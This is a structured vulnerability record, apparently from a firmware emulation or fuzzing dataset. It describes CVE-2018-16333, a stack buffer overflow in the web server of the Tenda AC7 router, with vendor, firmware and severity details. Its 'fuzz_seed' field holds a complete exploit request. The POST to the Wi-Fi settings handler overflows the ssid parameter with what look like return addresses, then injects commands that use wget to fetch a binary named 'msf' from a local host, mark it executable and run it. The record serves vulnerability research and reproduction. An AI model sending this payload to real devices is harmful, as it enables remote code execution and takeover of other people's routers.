vulnerability_id: CVE-2018-16333
affected_vendor: Tenda
firmware_version: AC7 V15.03.06.44_CN
firmware_architecture: ARM
file_system: Squashfs
vulnerability_type: Stack Overflow
vulnerability_score: 7.5
vulnerability_severity: High
CWE_type: CWE-119
communication_protocol: HTTP
simulation_method: qemu-system:armhf\uFF08docker\uFF09
vulnerability_description: An issue was discovered on Tenda AC7 V15.03.06.44_CN, AC9 V15.03.05.19(6318)_CN, AC10 V15.03.06.23_CN, AC15 V15.03.05.19_CN, and AC18 V15.03.05.19(6318)_CN devices. There is a buffer overflow vulnerability in the router's web server. While processing the ssid parameter for a POST request, the value is directly used in a sprintf call to a local variable placed on the stack, which overrides the return address of the function, causing a buffer overflow.
firmware_link: https://www.tenda.com.cn/download/detail-2682.html
fuzz_seed: |-
  POST /goform/fast_setting_wifi_set HTTP/1.1
  Host: 192.168.2.2
  Accept: */*
  Accept-Encoding: gzip, deflate
  Connection: keep-alive
  User-Agent: python-requests/2.25.1
  Cookie: Cookie=password=12345
  Content-Length: 135
  Content-Type: application/x-www-form-urlencoded

  ssid=aaaaD%D1%D7vbbbb%98%12%D3vp2%D7v%B8%9C%D5vwget+http%3A%2F%2F192.168.2.1%3A8000%2Ftools%2Fmsf+-O+%2Fmsf%0Achmod+777+%2Fmsf%0A%2Fmsf
